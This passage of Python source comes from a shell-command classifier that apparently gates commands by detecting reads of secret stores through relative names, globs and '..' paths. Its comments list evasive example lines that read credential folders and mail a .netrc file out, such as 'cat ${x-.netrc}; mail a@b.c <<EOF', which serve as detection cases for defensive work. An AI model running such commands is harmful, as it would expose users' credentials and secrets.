            while base in _PREFIXES and i < len(ws) and ws[i].startswith("-") and ws[i] != "-":
                word, i = ws[i], i + 1
                opt, eq, val = word.partition("=")
                at = (i - 1, len(opt) + 1)          # where the value starts: word, offset
                if len(opt) >= (3 if base == "env" else 5) and "--chdir".startswith(opt):
                    opt = "--chdir"                 # getopt takes a unique prefix: env --c=dir, sudo --chd=dir
                c = next((j for j in range(1, len(word)) if "-" + word[j] in _PREFIXES[base]), 0)
                if word[1:2] != "-" and len(word) > 2 and c:        # a short cluster or value: -iC dir, -Cdir
                    opt, eq, val, at = "-" + word[c], word[c + 1:], word[c + 1:], (i - 1, c + 1)
                if not eq and (opt in _PREFIXES[base] or opt in _CHDIR_OPTS.get(base, ())) and i < len(ws):
                    val, i, at = ws[i], i + 1, (i, 0)
                if opt in _CHDIR_OPTS.get(base, ()):
                    target(*at)
                    if val.startswith("="):         # -C=dir: getopt's "=dir"
                        target(at[0], at[1] + 1)
            if base == "timeout" and i < len(ws) and re.fullmatch(r"[\d.]+[smhd]?", ws[i]):
                i += 1
        prog, rest = (ws[i].rsplit("/", 1)[-1], ws[i + 1:]) if i < len(ws) else ("", [])
        if prog in ("cd", "pushd"):
            j = next((j for j, a in enumerate(rest) if not re.fullmatch(r"-[LPen@]*|--", a)), len(rest))
            if j < len(rest):
                target(i + 1 + j)
        elif prog == "git":
            j = 0
            while j < len(rest) and rest[j].startswith("-"):
                if rest[j] in ("-C", "-c", "--git-dir", "--work-tree", "--namespace", "--super-prefix", "--config-env"):
                    if rest[j] == "-C" and j + 1 < len(rest):
                        target(i + 2 + j)
                    j += 1
                j += 1
            skip.add(i + 1 + j)                     # the subcommand (`git config`) is not a path
        elif prog == "tar":                         # tar -C dir: the names after it are in dir
            j = 0
            while j < len(rest):
                a, j = rest[j], j + 1
                opt, eq, val = a.partition("=")
                if len(opt) >= 5 and "--directory".startswith(opt):        # --directory dir, --dir=dir
                    m, off = None if eq else j, len(opt) + 1
                elif re.fullmatch(r"-C.+", a):                              # -Cdir
                    m, off = None, 2
                elif re.fullmatch(r"-[A-Za-z]*C", a) or j == 1 and re.fullmatch(r"[A-Za-z]*C[A-Za-z]*", a):
                    # -C dir, -xC dir, -cfC x.tar dir, old-style czfC x.tar dir: the values follow in letter order
                    m = j + sum(c in "fbgFHIKLNTVX" for c in a[:a.index("C")])
                else:
                    continue
                if m is None:
                    target(i + j, off)
                elif m < len(rest):
                    target(i + 1 + m)
        elif prog in ("jq", "yq", "gojq", "jaq"):    # the filter (`jq .`) is not a path, unless it is read from a file
            first = next((f for f, a in enumerate(rest) if not a.startswith("-")), None)
            from_file = any(a == "--from-file" or a.startswith("--from-file=") or re.fullmatch(r"-[a-zA-Z]*f[a-zA-Z]*", a)
                            for a in rest)
            if first is not None and not from_file:
                skip.add(i + 1 + first)
        elif prog in _SHELLS:
            for j, a in enumerate(rest):
                if a == "-c" or (re.fullmatch(r"-[a-zA-Z]+", a) and "c" in a):
                    bodies += rest[j + 1:j + 2]
                    break
                if not a.startswith(("-", "+")):
                    break
            else:
                bodies += [h.body for h in k.heredocs] + [w.text for w in k.herestrings]
        # not the program, the targets, or the words before the program but assignments (`! time sudo -u root`)
        words = [w for j, w in enumerate(k.words) if j not in skip and (j > i or _ASSIGN.fullmatch(w.text))] + \
            [t for _, t in k.redirs]
        # (text, has an unquoted {); a word with a space is prose (a commit message, an echo, awk's '{print $1}'),
        # not a path, unless bash expands a brace set in it ({config,"a b"})
        # and a word with an expansion as _unknown_forms reads it (`c$(:)onfig` is `config` and `c*onfig`; #225)
        pieces += [(t, w.brace, n > 0) for w in words for n, t in enumerate([w.text] + _unknown_words(w.raw))
                   if w.brace or not re.search(r"\s", t)]


_ANY = object()                                     # any path, in _cd_store_read's index of levels up


def _could_be(s: str, name: str) -> bool:
    """Could the path part ``s`` be ``name`` (`..`, `run`, `.exo`) as bash matches it: the same text, or a glob
    (`.?`, `ru[n]`, `.*xo`) that spells a leading dot the same way. Both fold case (#601)."""
    if _fold(s) == _fold(name) or not _GLOBBY.search(s) or (s[:1] == ".") != (name[:1] == "."):
        return _fold(s) == _fold(name)
    pat = _fn_glob(s)
    return pat is None or fnmatch.fnmatchcase(_fold(name), _fold_glob(pat))


def _dotdot(q: str) -> str:
    """The relative name ``q`` with its leading parts that could be `..` (`.?`, `.*.`, also after a `./` or `.//`)
    read as `..`, or '' when it has none."""
    qs = [s for s in q.split("/") if s not in ("", ".")]
    n = next((j for j, s in enumerate(qs) if not _could_be(s, "..")), len(qs))
    return "/".join([".."] * n + qs[n:]) if n else ""


def _cd_store_read(cmds: list, subs: list, forms: bool = True, walked: list | None = None,
                   tools: tuple[str, ...] = ()) -> str:
    """D-038 (#192): a line that enters a folder that can hold a secret store may read it by a relative name. It
    enters one when a working-folder target anywhere in it ($( ), <( ) and a shell's text included) has a store
    folder among its parts (~/.kube, ~/.config/nvim, /proc/self; see _store_hints), or goes by a relative name into
    a plain store folder below another target (`cd ~/.config && cd ./gh`, `cd / && cd proc`). Then a relative name
    counts when its file name is a store file's (a glob or brace set: when it could match one) or it goes into a
    store folder (`gh/x` after ~/.config, `../.docker/x`); any relative name counts when the target is itself a
    store. The targets' own words are not names. ``tools`` are the folders a shell call runs in by its own `cwd`
    or `workdir` argument (#311): each counts as one more target, as a leading cd would. The name, or ''. One pass
    over the words; neither the order nor the success of the commands is followed, so this fails closed. Without
    ``forms``, only the words as written are read, with no `..` reading of a glob and no folder that holds a run
    folder (#320 adds those): the name the line is read with before them, kept beside theirs. ``walked`` keeps the
    walk and the store tests for a second call on the same line."""
    if walked:
        targets, pieces, stored = walked
    else:
        targets, pieces, stored = [], [], {}
        bodies: list = []
        _cd_walk(cmds, targets, pieces, bodies)
        queue = [(s, 0) for s in subs] + [(b, 1) for b in bodies]
        seen: dict = {}             # text -> the shallowest depth it was read at
        while queue:                # each $( ), <( ) and shell text once per depth at most, nested ones too
            text, n = queue.pop()   # (subs may list them already); a text first met at the depth cap is read again
            if seen.get(text, _DEPTH + 1) <= n:     # when it comes up shallower, so its own bodies are not lost
                continue
            seen[text] = n
            c2, s2 = _parse(text)[:2]
            more: list = []
            _cd_walk(c2, targets, pieces, more)
            if n < _DEPTH:
                queue += [(s, n + 1) for s in s2] + [(b, n + 1) for b in more]
        if walked is not None:
            walked += [targets, pieces, stored]
    targets = [t for t, form in targets if forms or not form]
    pieces = [(t, brace) for t, brace, form in pieces if forms or not form]
    targets += tools                        # #311: the folder a shell call runs in, as a leading cd would enter it
    if not targets:
        return ""
    singles, pairs, names = _store_hints()
    home = os.path.normpath(_home())
    root = home.rstrip("/") + "/"
    hp = home.rstrip("/").split("/")                # "/home/u": ["", "home", "u"]
    kin: dict = {}                                  # plain store folder name -> [(its parent, its sample path)]
    for (a, b), path in pairs.items():
        kin.setdefault(b, []).append((a, path))
    deep = max(len(p.split("/")) for p in pairs.values())       # the parts of the deepest sample store folder

    def here(t: str) -> str:                        # the current folder as `.`, ${PWD%/*/*} as `../..`
        return _HERE.sub(lambda m: "/".join([".."] * m.group(0).count("/*")) if "%" in m.group(0) else ".", t)

    def folders(t: str) -> tuple:
        t = here(t)
        if re.match(r"~[\w.-]+(/|$)", t):          # ~root/..: that home, before .. is resolved
            t = os.path.expanduser(t)
        p = _expand_text(t)
        p = os.path.normpath(p) if p else p         # bash's logical cd: /tmp/../proc is /proc, ./gh is gh
        p = "~" if _fold(p) == _fold(home) else "~/" + p[len(root):] if _fold(p).startswith(_fold(root)) else p
        parts = _brace_glob(p).split("/")
        parts[0] = "~" if parts[0].startswith("~") else parts[0]        # ~user/.kube: its folders
        return p, [s for j, s in enumerate(parts) if s not in ("", ".") or j == 0 and s == ""] or ["."]

    def could_be(s: str, prev) -> set:
        """The store folder names a glob part could be below the part ``prev``, as bash matches: a dot name only
        when the glob spells the dot, a folder that is a store by its name anywhere (Netlify) only when the glob
        has a character of its own, and a plain store folder only below its parent."""
        own = bool(re.sub(r"[*?]|\[[^\]]*\]?", "", s))
        return {x for x in singles if (x[:1] == ".") == (s[:1] == ".") and (x[:1] == "." or own)} | \
            {b for a, b in pairs if _fold(a) == _fold(prev) and (b[:1] == ".") == (s[:1] == ".")}

    def last_store_folder(parts: list) -> int:
        return max((k for k, s in enumerate(parts) if _fold(s) in singles or
                    k and (_fold(parts[k - 1]), _fold(s)) in pairs or
                    _GLOBBY.search(s) and _could_name(s, could_be(s, parts[k - 1] if k else None))), default=-1)

    # A plain store folder's parent above each target: name -> {levels up: its paths}. A target below home also
    # has home's own folders above it; a relative one only its own parts (what it is below is not known). A path
    # deeper than any sample store folder's parent keeps only its name, which is all a dot parent needs.
    parents = {a for a, _ in pairs}
    anc: dict = {}
    top: dict = {}                                  # (name, its path or _ANY) -> the most levels up it is at
    lo: dict = {}                                   # the fewest levels up at which / is

    def index(parts: list) -> None:
        up = [(hp[m], "/".join(hp[:m + 1])) for m in range(len(hp) - 1)] if parts[0] == "~" else []
        chain = up + [(s, "/".join(parts[:j + 1]) if j < deep else None) for j, s in enumerate(parts) if s != ".."]
        for n, (name, path) in enumerate(reversed(chain)):
            if _fold(name) in parents:
                path = _fold(path) if path else path
                anc.setdefault(_fold(name), {}).setdefault(n, set()).add(path)
                for key in ((_fold(name), path), (_fold(name), _ANY)):
                    top[key] = max(top.get(key, -1), n)
                if name == "":
                    lo[""] = min(lo.get("", n), n)

    def alts(t: str) -> list:
        """The target's brace alternatives, a relative one with a glob (`$PWD/` and the like read as `./`) also with
        its leading parts that could be `..` read as `..` (#269): normpath makes `cd .?/..` `.`, and when `.?` is `..`
        it is `../..`."""
        return [x for a in _brace_alts(t) for h in [here(a)] for x in [a] + ([u for u in [_dotdot(h)] if u] if forms
                and h[:1] not in ("/", "~", "$") and "/.." in "/" + h and _GLOBBY.search(h) else [])]

    split = [(p, parts, last_store_folder(parts)) for t in dict.fromkeys(targets) for alt in alts(t)
             for p, parts in [folders(alt)]]
    for _, parts, _ in split:
        index(parts)
    # `cd ..`, `cd ../..`, `cd .. && cd ..`: every number of levels up to all of them together (order is not
    # followed); past 64, any number. A part counts when it could be `..` (`.?`, and `.$(:).` read as `.*.` and `..`)
    total = sum(len(parts) for t in targets if "." in here(t) for alt in alts(t) for _, parts in [folders(alt)]
                if (all(_could_be(s, "..") for s in parts) if forms else set(parts) == {".."}))
    ups = set(range(min(total, 65) + 1))

    def reach(n: int, a: str, need) -> bool:
        """A folder named ``a`` (at path ``need`` for a plain parent) n levels above a target, or above a `cd ..`
        after one. `..` stops at /."""
        levels = anc.get(_fold(a), {})
        if a == "" and lo.get("", n + max(ups) + 1) <= n + max(ups):
            return True
        if len(ups) > 64:                           # any number of levels up: is it there n or more levels up?
            return top.get((_fold(a), _ANY if need is None else _fold(need)), -1) >= n
        return any(m in levels and (need is None or _fold(need) in levels[m]) for m in (n + u for u in ups))

    matched: dict = {}                              # a glob -> the plain store folder names it could match

    def into(parts: list, globs: bool = True) -> list:
        """A relative path into a plain store folder below another target (`cd ~/.config && cd ./gh`, `cd / && cd
        proc/self`, `cd ~/.config/nvim && cd ../gcloud`): [(that store folder's sample path, the rest)]. The other
        target names a dot parent by its name (any .config) and a plain one by its path (/, EXO_HOME)."""
        n = next((j for j, s in enumerate(parts) if s != ".."), len(parts))
        if n == len(parts) or parts[0] in ("", "~"):
            return []
        first = parts[n]
        if globs and _GLOBBY.search(first) and first not in matched:
            matched[first] = _glob_names(first, kin) if _could_name(first, set(kin)) else []
        hits = matched[first] if globs and _GLOBBY.search(first) else [b for b in kin if _fold(b) == _fold(first)]
        return [(path, parts[n + 1:]) for b in hits for a, path in kin[b]
                if reach(n, a, None if a in singles else path.rpartition("/")[0])]

    # A relative target into a plain store folder enters it, at that folder's sample path. Its own folders then
    # count as parents too (`cd /srv && cd exo-home && cd keys` with EXO_HOME=/srv/exo-home); a chain is as deep
    # as the sample paths, so this ends.
    after: dict = {}
    new = {"/".join([path, *rest]): None for _, parts, _ in split for path, rest in into(parts)}
    while new.keys() - after.keys():
        fresh = new.keys() - after.keys()
        after.update(new)
        for full in fresh:
            index(full.split("/"))
        new = {"/".join([path, *rest]): None for _, parts, _ in split for path, rest in into(parts)}
    split += [(full, full.split("/"), last_store_folder(full.split("/"))) for full in after]
    entered = [(p, parts, k) for p, parts, k in split if k >= 0]

    def is_store(folder: str) -> bool:
        """Is the folder a store? A glob in it (`~/.s?h`) is tried as each store folder name it could be
        (could_be). Past 64 such paths, it counts as one."""
        if folder not in stored:
            parts = folder.split("/")
            opts = [_glob_names(s, could_be(s, parts[j - 1] if j else None)) if _GLOBBY.search(s) else [s]
                    for j, s in enumerate(parts)]
            count = 1
            for o in opts:
                count = min(count * len(o), 65)
            paths = ["/".join(x) for x in itertools.product(*opts)] if count <= 64 else []
            stored[folder] = count > 64 or any(_sensitive_re().search(_fold(x)) or is_sensitive_path(x) for x in paths)
        return stored[folder]

    def candidates():
        """The relative names on the line: (name, its parts, whether it is a glob); no parts is the folder itself
        (`.`, `$PWD`). A quoted glob counts too, for the tools that match it themselves (`find -name 'conf*'`)."""
        for word, brace in dict.fromkeys(pieces):
            for text in [here(_brace_glob(x)) for x in _brace_alts(word)] if brace else [here(word)]:
                # --kubeconfig=config, -d@config, f:=@config; a glob class (e[[:alpha:]]viron) stays whole
                whole = text.count("[") > 32 or _NESTED_CLASS.search(text)
                for q in re.split(r"[=@:,]", text) + ([text] if whole else []):
                    q = here(q)
                    q = _expand_text(q) if q[:1] in ("$", "~") else q
                    if not q or q.startswith(("/", "-")) or q.startswith("~") and q[1:2] not in ("+", "-"):
                        continue
                    # `.?/..` is `.` and, when `.?` is `..`, `../..` (#269)
                    up = _dotdot(q) if forms and "/.." in "/" + q and _GLOBBY.search(q) else ""
                    q = os.path.normpath(q) if "/.." in "/" + q else q         # lua/../../gcloud is ../gcloud
                    for r in dict.fromkeys([q, os.path.normpath(up)] if up else [q]):
                        yield r, [s for s in r.split("/") if s not in ("", ".")], bool(_GLOBBY.search(r))

    if not entered:
        # A name can still go into a plain store folder below a target: it counts when it names a store file or
        # goes into a store (`cd /srv && tar cf - exo-home/keys` with EXO_HOME=/srv/exo-home).
        for q, parts, globbed in candidates():
            for path, rest in into(parts, globbed) if parts else []:
                fp = f"{path}/{'/'.join(rest)}".rstrip("/").split("/")
                if _fold(parts[-1]) in names or is_store("/".join(fp[:last_store_folder(fp) + 1])):
                    return q
        return _exo_relative(split, max(ups), candidates, forms)
    nxt = {b for b in kin if into([b])}             # `cd ~/.config && cat gh/hosts.yml`: for a glob piece
    # Is a target itself a store? One full test per store folder it is in (`cd ~/.kube/a1; cd ~/.kube/a2`: one).
    roots = dict.fromkeys("/".join(parts[:k + 1]) for _, parts, k in entered)
    every = any(_sensitive_re().search(_fold(p)) for p, _, _ in entered) or any(map(is_store, roots))
    hints = names | singles | nxt
    held = any(k == len(parts) - 1 for _, parts, k in entered)     # a target is itself a store folder (~/.kube)
    for q, parts, globbed in candidates():
        if every or not parts and held:             # `tar czf - .` in a store, or in a store folder
            return q
        if not parts:
            continue
        inner = parts[:-1]              # a store folder counts when the name goes into it (`mkdir .kube` reads none)
        fi = [_fold(s) for s in inner]
        if _fold(parts[-1]) in names or not singles.isdisjoint(fi) or into(parts, globbed) or \
                not pairs.keys().isdisjoint(zip(fi, fi[1:])) or globbed and any(
                    _could_name(s, hints) for s in parts if _GLOBBY.search(s)):
            return q
    return _exo_relative(split, max(ups), candidates, forms)


_EXO_PARTS = 65536   # path parts of the folders and paths _exo_relative may build in one classify call (#269)


class _Spent(Exception):
    pass


_TOO_MANY = "a path in the Exo store (too many to resolve)"     # what _cd_store_read names past the #269 budget


def _exo_relative(split: list, up: int, candidates: Callable[[], Iterable[tuple]], forms: bool = True) -> str:
    """#269: on a line that reaches a folder in `$EXO_HOME` (or any `.exo`), that folder and each relative name read
    from it are checked as the paths they are, as the kernel resolves them, `..` included, so `cd ~/.exo/run/jobs &&
    grep -r . ..`, `cat ../exod*` there, `cd ~/.exo/run/jobs && cd .. && ls` and `tar -C ~/.exo -czf - run` reach the
    run folder and its secrets as the absolute path would (is_sensitive_path, a glob in it). The folders are the
    targets (``split``, as _cd_store_read reads them; one with a glob as the folders it could be, below), each
    relative target joined to each of them, and every folder up to ``up`` levels above them (`cd ..`, counted once:
    a `..` target is not joined too); an absolute target is also resolved (a link into the store). From a folder above the store only a target or name with the
    store's folder name as a part (`.exo`, `exo-home`) is joined, so `cd /srv && tar cf -
    exo-home/run` counts and a line that names no store folder joins nothing. Each join and each level up is charged,
    as it is made, the path parts of what it builds (its checks cost about that much: a deep glob name costs more than a
    short one) to one budget of _EXO_PARTS shared by the whole classify call (each `$( )` is classified again, nested
    ones too), so the work stays linear in the line; past it, or past 64 store folders, the line counts (fails
    closed). A target with a glob is read as the folders in the store it could be (`~/.e*o/run/jobs`, `r?n/jobs`,
    and `~/.exo/r$(printf u)n/jobs` read as `.../r*n/jobs`; settle), a name's leading parts that could be `..` as
    `..` (`.?`), and a name counts too when it could be a folder that holds a run folder (the store's own, its
    principals folder or a principal's store: `../..` from run/jobs, `principals/me`, `.` there) or, by a glob, a
    run folder (`ru?`), since a recursive read of it reads the secrets. Without ``forms`` none of these readings is
    made (_cd_store_read), on a budget of its own. The name or folder, or ''."""
    home = os.path.normpath(_home())
    exo = os.path.normpath(_exo_home())
    roots = _path_forms(exo)
    tops = [r.rstrip("/").split("/") for r in roots]
    marks = {".exo", os.path.basename(exo)} - {""}
    memo = _call_memo.get()
    left = [_EXO_PARTS] if memo is None else memo.setdefault("exo_parts" if forms else "exo_parts_written", [_EXO_PARTS])
    if left[0] < 0:
        return _TOO_MANY

    def inside(b: str, real: bool = False) -> bool:
        return any(re.search(r"(^|/)\.exo(/|$)", _fold(f)) or
                   any(_fold(f) == _fold(r) or _fold(f).startswith(_fold(r).rstrip("/") + "/") for r in roots)
                   for f in (_path_forms(b) if real else {os.path.normpath(b)}))

    def near(q: str) -> bool:                       # a relative path that can lead into the store from above it
        return not marks.isdisjoint(map(_fold, q.split("/")))

    def charge(path: str) -> None:                  # one join or level up, by the path parts it builds
        left[0] -= path.count("/") + 1
        if left[0] < 0:
            raise _Spent

    def join(b: str, q: str) -> str:
        w = os.path.join(b, q)
        charge(w)
        return w

    def grow(bases: set, more: str) -> None:
        bases.add(more)
        if len(bases) > 64:
            raise _Spent

    def settle(p: str) -> list:
        """A target with a glob as the folders in the store it could be: its parts up to the store's own folder (or
        a `.exo` one; none for a relative one) as that folder, and a glob below it read along each tail of a
        principal's run/jobs path that it fits (`r?n/jobs`, `p*/me/run/jobs`, `*/*/run/jobs`, `j?bs` from run):
        each glob part as the part it could be (after `principals`, a principal's store), and past that tail as
        `..` when it could be one (`run/jobs/.?`). [] when it cannot be one."""
        parts = p.split("/")
        top = next((t for t in tops if len(parts) >= len(t) and all(map(_could_be, parts, t))), None)
        if top is None:
            j = next((j for j, s in enumerate(parts) if _could_be(s, ".exo")), -1)
            if j < 0 and p[:1] == "/" or j >= 0 and _GLOBBY.search("/".join(parts[:j])):
                return []
            top = parts[:j] + [".exo"] if j >= 0 else []
        rest = parts[len(top):]
        if not _GLOBBY.search("/".join(rest)):
            return ["/".join(top + rest)]
        n = next((k for k, s in enumerate(rest) if not _could_be(s, "..")), len(rest))   # leading `..` parts
        out = []
        for shape in (["principals", None, "run", "jobs"][i:] for i in range(4)):
            got = [".."] * n
            for k, s in enumerate(rest[n:]):
                want, g = shape[k] if k < len(shape) else "", _GLOBBY.search(s)
                if want and s != want and not (g and _could_be(s, want)):
                    break
                got.append(want or ("me" if want is None else ".." if _could_be(s, "..") else "x") if g else want or s)
            else:
                out.append(os.path.normpath("/".join(top + got)))
        return out

    def holds(w: str) -> bool:
        """Could the path ``w`` be a folder that holds a run folder, or by a glob a run folder itself?"""
        parts = os.path.normpath(w).split("/")
        ends = [len(t) for t in tops if len(t) <= len(parts) <= len(t) + 3 and all(map(_could_be, parts, t))]
        ends += [j + 1 for j in range(max(len(parts) - 4, 0), len(parts)) if _could_be(parts[j], ".exo")]
        for n in ends:
            rest = parts[n:]
            if not rest or len(rest) == 1 and (_could_be(rest[0], "run") or _could_be(rest[0], "principals")) or \
                    _could_be(rest[0], "principals") and (len(rest) == 2 or len(rest) == 3 and _could_be(rest[2], "run")):
                return True
        return False

    folders: list[str] = []
    for p, _, _ in split:
        f = os.path.join(home, p[2:]) if p.startswith("~/") else home if p == "~" else p
        if f or not forms:
            folders += [f] if not (_GLOBBY.search(f) or "$" in f) else [] if "$" in f or not forms else settle(f)
    folders = list(dict.fromkeys(folders))
    # a `cd ..` is the level-up walk below (``up`` counts every one on the line), not a join as well
    relative = [r for r in folders if not r.startswith("/") and set(r.split("/")) != {".."}]
    try:
        bases: set = set()
        for b in folders:
            if inside(b, b.startswith("/")):
                grow(bases, b)
        # a folder outside the store that a name can lead into it from: one above it (a relative folder adds nothing
        # a name with `.exo` in it does not already spell)
        outer = [b for b in folders if b.startswith("/") and b not in bases and any(
            r.startswith(b.rstrip("/") + "/") for r in roots)]
        toward = [r for r in relative if near(r)]
        for b in outer:
            for r in toward:
                j = os.path.normpath(join(b, r))
                if inside(j):
                    grow(bases, j)
        for b in list(bases):
            for r in relative:
                j = os.path.normpath(join(b, r))
                if inside(j):
                    grow(bases, j)
        for b in list(bases):
            for _ in range(min(up, 64)):
                charge(b)
                b = os.path.dirname(b)
                if not b or not inside(b):
                    break
                grow(bases, b)
        hit = next((b for b in sorted(bases) if _sensitive_words([b])), "")
        if hit:
            return hit
        names = list(dict.fromkeys(q for q, _, _ in candidates()))
        # a name whose leading parts could be `..` (`.?`, `.*.`, `./.?`) is read with them as `..` too
        ups = [(q, u) for q in names if forms and _GLOBBY.search(q) for u in [_dotdot(q)] if u]
        read = [(q, q) for q in names] + ups          # (the name, how it is read)
        words = [(q, join(b, r)) for b in sorted(bases) for q, r in read]
        words += [(q, w) for b in outer for q, r in read if near(r) for w in [join(b, r)] if inside(w)]
    except _Spent:
        return _TOO_MANY
    hit = next((q for q, w in words if holds(w)), "") if forms else ""
    if hit or not words or not (_sensitive_words([w for _, w in words]) or _glob_words([w for _, w in words])):
        return hit
    return next((q for q, w in words if _sensitive_words([w]) or _glob_words([w])), words[0][0])


def classify_shell(cmd: str, depth: int = 0) -> Classification:
    """Classify a shell command line; a compound line takes its most severe part. Within one top-level call a line is
    classified once per depth and state of the budgets (_shell_seen), and each caller gets its own copy. A line
    read under the _fed_stdin mark (#316) is a different read of the same text, so the mark is part of the key;
    the mark names one line, and reading that line spends it. A line with a `$` form split by a backslash-newline is
    noted for classify, and on its joined reading (_joining, #584) read joined, a line read again from a word
    (`bash -c`, eval, ssh, a backquoted body) too."""
    joining = _joining.get()
    if joining is not None and cmd and (line := _join_dollars(cmd)) != cmd:
        joining[1] = True
        if joining[0]:
            cmd = line
    seen = _shell_seen.get()
    if seen is None:
        token = _shell_seen.set({})
        try:
            return classify_shell(cmd, depth)
        finally:
            _shell_seen.reset(token)
    fed = _fed_stdin.get()
    if fed:
        _fed_stdin.set(False)
    # The budgets only fall: a line met after one fell is read again. A $( ) after `cd` into the store is read in it.
    key = ("shell", cmd, depth, _budgets(), _cd_into.get(), fed)
    if key not in seen:
        if (loops := _loop_pass.get()) is not None:      # #479 verify: the second reading's budget
            loops[2] += -1 if loops[0] else 1
            if loops[2] < 0:
                raise _LoopBudget
        own = _own_text.set([None])           # this line's own slot, not the one of the line around it (#394)
        try:
            seen[key] = _classify_shell(cmd, depth, fed)
        finally:
            _own_text.reset(own)
    return _own_copy(seen[key])


def _budgets() -> tuple:
    """What is left of the call's budgets (_brace_budget, _exo_relative), on which a line's result can depend."""
    left, memo = _brace_left.get(), _call_memo.get()
    return (None if left is None else tuple(left),
            None if memo is None else tuple(memo.get(k, [_EXO_PARTS])[0] for k in ("exo_parts", "exo_parts_written")))


def _own_copy(c: Classification) -> Classification:
    """A stored result for one caller, who may change its fields and lists. The parts it was built from (D-075) are
    shared: no caller changes a part in place but the ssh hop, which copies its result first."""
    return replace(c, signals=list(c.signals), parts=list(c.parts), _command_views=list(c._command_views))


def _store_post_text(c: Classification, body: str) -> None:
    """Give a store line's here-doc body to the most severe post the store write outranks, as the line itself took
    it when the post was the line (#435): also a post inside a nested line (`bash <<EOF` feeding `mail -A ..`).
    On a secret line, the most severe post below the secret and any store write takes it so (#320: `cat
    ${x-.netrc}; mail a@b.c <<EOF`, which these forms make a secret line, keeps its posting checks).
    Parts are shared (_own_copy), so the post and each part on the way down to it are copied, never changed."""
    above = ("store_write",) if c.category == "store_write" else ("store_write", "credentials")
    post = _most_severe(p for p in _each_part(c) if p.category not in above)
    if post is None or post.text or post.text_file or post.category not in OUTBOUND or post.category == "web_post":
        return
    seen: dict[int, Classification] = {id(post): replace(post, text=body)}

    def walk(p: Classification) -> Classification:
        if id(p) not in seen:
            seen[id(p)] = p          # a part met again through a shared one is left as it is
            kids = [walk(q) for q in p.parts]
            if any(a is not b for a, b in zip(kids, p.parts)):
                seen[id(p)] = replace(p, parts=kids)
        return seen[id(p)]
    c.parts = [walk(p) for p in c.parts]


def _unread_nest() -> Classification:
    """What a $( ) nested past _NEST stands for: an opaque part, signed so that an exported value keeps it."""
    c = _too_deep("", f"a $( ) nested more than {_NEST} levels deep, or in a ${{..}} word or $(( past "
                      f"{_WORD_NEST + 1} levels or {_WORD_PARTS} parts, not read")
    c.signals.append("unread nest")
    return c


def _weigh(line: Classification, whole: Classification, cmd: str) -> Classification:
    """A secret beside an irreversible command keeps that command's weight: the line takes it from its own parts.
    A heavier command deeper in ``whole``, as one that a store write in a $( ) holds (#465), is a credentials part
    with that weight beside the line, which the #191 pass reads. So its matrix cell's deny holds, and the line keeps
    the cell of its own weight where a policy makes that one stricter (#468). ``line`` is the secret, a credentials
    line or part, the store read from a shell call's own folder too (#311). One walk over every part the line was
    built from, made only when a secret decides it."""
    deep = max((q.reversibility for q in _each_part(whole)), key=REVERSIBILITY.index)
    if REVERSIBILITY.index(deep) > REVERSIBILITY.index(line.reversibility):
        line.parts = [*line.parts, _make("credentials", summary=line.summary, target=line.target, command=cmd,
                                         reversibility=deep, own=None, signals=["secret store"])]
    return line


def _classify_fed(cmd: str, depth: int, fed: bool) -> Classification:
    """classify_shell(cmd, depth), for a line fed a stdin the gate cannot read when `fed` (#316)."""
    mark = _fed_stdin.set(fed)
    try:
        return classify_shell(cmd, depth)
    finally:
        _fed_stdin.reset(mark)


def _classify_sub(sub: str, depth: int, fed: bool, line: bool = False) -> Classification:
    """A substitution's body, read as fed a stdin the gate cannot read when `fed` or when it is a >( ) (#316). An ssh
    in it that runs that stdin runs the stdin of the line around it only when that line was fed one (`line`) and the
    body is no >( ), whose stdin is what the command around it writes; else its signal stays in the body."""
    out = isinstance(sub, _OutSub)
    c = _classify_fed(sub, depth, fed or out)
    if (out or not line) and _LINE_STDIN in c.signals:
        c.signals.remove(_LINE_STDIN)
    return c


def _read_cmd(k: _Cmd, prev: _Cmd | None, cmd: str, depth: int, ctx: dict, slot: list) -> list[Classification]:
    """The parts of one simple command k of line ``cmd``, read in the line's order: ``prev`` is the command before it,
    ``ctx`` what the line has set so far, ``slot`` the line's own text slot (#394). _classify_shell reads each command
    so, and so does a loop's second pass (#479)."""
    piped = _piped_text(prev, ctx.setdefault("piped", {})) if (k.piped_in and prev is not None) else None
    # A post's body from stdin (#208): only what one simple command writes, never a compound's last command.
    ctx["post_stdin"] = _literal_stdin(k, _literal_pipe(prev) if k.piped_in and not k.piped_group else None)
    slot[0] = k.own
    own = _literal_assigns(k, ctx["literals"])
    late = _applies_late(k)     # an exporter's arguments expand before its assignments apply (#579)
    if not late:
        ctx["literals"].update(own)    # what this command sets, the next ${..@P} reads (#579)
    got = _classify_simple(k, cmd, depth, ctx, piped)
    if late:
        ctx["literals"].update(own)
    if k.fed or k.piped_in or _own_stdin(k):          # a nested shell in it reads this stdin (#394)
        got = _given_stdin(got, _stdin_own(k), ctx)
    return got


_LOOP_WORDS = frozenset({"while", "until", "for", "select"})


def _loop_word(k: _Cmd) -> int:
    """Where the `while`, `until`, `for` or `select` is among the reserved words k starts with (`do for x in ..`), or
    after a `coproc [NAME]` or `function NAME` that starts k, where _parse opens a compound too; or -1."""
    for i, w in enumerate(k.words):
        if w.quoted or not (w.text in _OPENERS or w.text in _LOOP_WORDS):
            break
        if w.text in _LOOP_WORDS:
            return i
    first = k.words[0] if k.words else None
    if first is not None and not first.quoted and first.text in ("coproc", "function"):
        return next((i for i in (1, 2) if i < len(k.words) and not k.words[i].quoted
                     and k.words[i].text in _LOOP_WORDS), -1)
    return -1


def _brace_head(cmds: list[_Cmd], b: int) -> int:
    """#479 verify: the header of the `for` or `select` loop whose body is the `{ ..; }` group that cmds[b] starts, or
    -1. bash takes such a group as the body (`for i in 1 2; { ..; }`, `select x in a b; { ..; }`, `for ((..)) { ..; }`)
    and runs it once per pass in the same shell, as a `do ..; done` body. _parse opens no loop there. For `for ((..))`
    _parse marks the `{` that follows the header's closing `))` (_Cmd.arith_for: the command holding the `for`, however
    many commands it reads the arithmetic as and whatever words they start with, `do` or `while` as a variable too).
    Else the header is the command just before the group (`for x [in ..]`, after `do` or a `coproc` too), with no
    `do` after its name."""
    first = cmds[b].words[0] if cmds[b].words else None
    if first is None or first.quoted or first.text != "{":
        return -1
    if cmds[b].arith_for >= 0:
        return cmds[b].arith_for
    if b == 0 or (w := _loop_word(cmds[b - 1])) < 0:
        return -1
    words = cmds[b - 1].words
    return b - 1 if words[w].text in ("for", "select") and not any(
        not x.quoted and x.text == "do" for x in words[w + 1:]) else -1


def _loop_spans(cmds: list[_Cmd], went: list[tuple[int, str]]) -> list[tuple[int, int]]:
